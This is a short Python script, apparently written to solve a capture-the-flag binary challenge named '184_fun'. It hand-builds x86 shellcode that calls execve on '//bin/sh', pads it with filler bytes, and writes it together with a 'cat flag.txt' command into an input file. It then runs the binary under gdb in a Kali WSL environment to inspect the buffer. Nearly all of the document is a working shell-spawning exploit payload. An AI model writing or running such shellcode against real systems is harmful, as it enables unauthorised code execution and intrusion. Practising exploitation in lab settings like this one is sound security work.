import sys, subprocess
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
CWD = r"/tmp/cylab_eps"
ins = ["89e7"]
for ch in "//bin/sh":
    ins.append("b0%02x" % ord(ch))
    ins.append("aa90")
ins += ["31c0", "aa90", "89e3", "5090", "5390", "89e1", "b00b", "cd80"]
sc = b"".join(bytes.fromhex(i) for i in ins)
payload = b""
for i in range(0, len(sc), 2):
    payload += sc[i:i + 2] + b"AA"
open(CWD + r"\in184.bin", "wb").write(payload + b"\ncat flag.txt\n")
gdb = """set pagination off
break *0x80492b0
run < in184.bin
printf "buf=%p len=%d\\n", $eax, *(int*)($ebp-0x14)
x/80bx $eax
quit
"""
open(CWD + r"\g184.gdb", "w").write(gdb)
out = subprocess.run(["wsl", "-d", "kali-linux", "--", "bash", "-c",
                      "cd /tmp/cylab_eps && "
                      "gdb -nx -q -batch -x g184.gdb ./184_fun 2>&1 | tail -20"],
                     capture_output=True, text=True).stdout
print(out)
